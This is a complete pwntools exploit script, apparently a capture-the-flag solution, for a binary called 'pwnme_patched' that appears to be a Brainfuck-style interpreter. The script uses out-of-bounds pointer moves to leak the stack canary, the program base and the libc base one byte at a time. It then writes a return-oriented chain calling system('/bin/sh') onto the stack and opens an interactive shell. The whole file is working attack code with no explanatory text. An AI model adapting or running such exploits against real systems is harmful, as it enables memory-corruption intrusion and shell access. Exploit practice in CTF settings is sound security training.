#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pwnme_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x1529
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def leak_canary():
    canary = b""

    for idx in range(8):
        shift_pc = b">"*(0x48 + idx) + b"."
        io.sendlineafter(b">", shift_pc)
        canary += io.recv(1)

    canary = u64(canary)
    info("stack canary: %#x", canary)


def leak_elf():
    elf = b""

    for idx in range(8):
        shift_pc = b">"*(0x58 + idx) + b"."
        io.sendlineafter(b">", shift_pc)
        elf += io.recv(1)

    exe.address = u64(elf) - 0x1521
    info("elf base: %#x", exe.address)


def leak_libc():
    base = b""

    for idx in range(8):
        shift_pc = b">"*(0x78 + idx) + b"."
        io.sendlineafter(b">", shift_pc)
        base += io.recv(1)

    libc.address = u64(base) - 0x29d90
    info("libc base: %#x", libc.address)


def do_rop():
    pop_rdi = libc.address + 0x2a3e5 # pop rdi ; ret
    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]
    ret = exe.address + 0x101a # ret;
    offset = 0x78
    idx = 0

    payload = flat([
        pop_rdi,
        sh,
        ret,
        system
    ])

    info("pop rdi: %#x", pop_rdi)

    for byte in payload:
        shift_pc = b">"*(offset + idx) + b","
        io.sendlineafter(b">", shift_pc)
        io.sendline(bytes([byte]))
        idx += 1

    # trigger rop chain on main ret stack
    io.sendline(b"q")
    io.clean()


def solve():

    leak_canary()
    leak_elf()
    leak_libc()
    do_rop()
    

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
